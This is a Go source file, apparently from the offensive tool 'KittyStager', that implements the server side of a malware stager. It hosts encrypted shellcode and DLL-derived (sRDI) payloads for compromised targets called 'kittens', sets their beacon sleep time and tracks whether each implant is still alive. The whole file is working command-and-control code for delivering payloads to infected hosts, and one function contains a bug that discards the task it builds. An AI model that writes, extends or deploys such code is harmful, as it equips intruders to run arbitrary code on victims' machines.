package http

import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/srdi"
	"KittyStager/cmd/util"
	"encoding/json"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"os"
	"time"
)

var Targets map[string]*Kitten

// HostShellcode Hosts the shellcode
func HostShellcode(path string, kittenName string) error {
	var task *util.Task
	var err error
	key := Targets[kittenName].GetKey()
	sc, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	contentType := http.DetectContentType(sc)
	//checks if the file is a hex file
	if contentType == "text/plain; charset=utf-8" {
		util.NewTask("shellcode", sc)
		// check if the file is a binary
	} else if contentType == "application/octet-stream" {
		hexstring := fmt.Sprintf("%x ", sc)
		util.NewTask("shellcode", []byte(hexstring))
	}
	payload, err := json.Marshal(task)
	if err != nil {
		return err
	}
	shellcode, err := crypto.Encrypt(payload, key)
	if err != nil {
		return err
	}
	Targets[kittenName].SetPayload(shellcode)
	fmt.Println(color.Green("[+] Shellcode hosted for " + kittenName))
	return error(nil)
}

// HostSleep Hosts the sleep time the same way as the shellcode
func HostSleep(t int, kittenName string) error {
	Targets[kittenName].SetSleep(t)
	task := util.NewTask("sleep", []byte(fmt.Sprintf("%d", t)))
	key := Targets[kittenName].GetKey()
	payload, err := json.Marshal(task)
	if err != nil {
		return err
	}
	sleep, err := crypto.Encrypt(payload, key)
	if err != nil {
		return err
	}
	Targets[kittenName].SetPayload(sleep)
	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(kittenName))
	return error(nil)
}

// HostDll Hosts the shellcode converted dll
func HostDll(path, entry, kittenName string) error {
	var err error
	key := Targets[kittenName].GetKey()
	dll, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	sc, err := srdi.DllToShellcode(dll, entry)
	if err != nil {
		return err
	}
	hexstring := fmt.Sprintf("%x ", sc)
	task := util.NewTask("shellcode", []byte(hexstring))
	payload, err := json.Marshal(task)
	if err != nil {
		return err
	}
	shellcode, err := crypto.Encrypt(payload, key)
	if err != nil {
		return err
	}
	fmt.Println(color.Green("[+] Key generated is : " + key))
	Targets[kittenName].SetPayload(shellcode)
	fmt.Println(color.Green("[+] Dll hosted for " + kittenName))
	return error(nil)
}

// CheckAlive checks if the malware is alive. If last seen is longer that the sleep time it will mark it
func CheckAlive() {
	for {
		time.Sleep(1 * time.Second)
		for name, x := range Targets {
			if Targets[name].Alive {
				t := time.Since(x.GetLastSeen())
				sleepTime := time.Duration(x.GetSleep()) * time.Second
				if t > sleepTime+5*time.Second {
					Targets[name].SetAlive(false)
					fmt.Println(color.Red("\n[!] Kitten " + name + " died."))
				}
			}
		}
	}
}
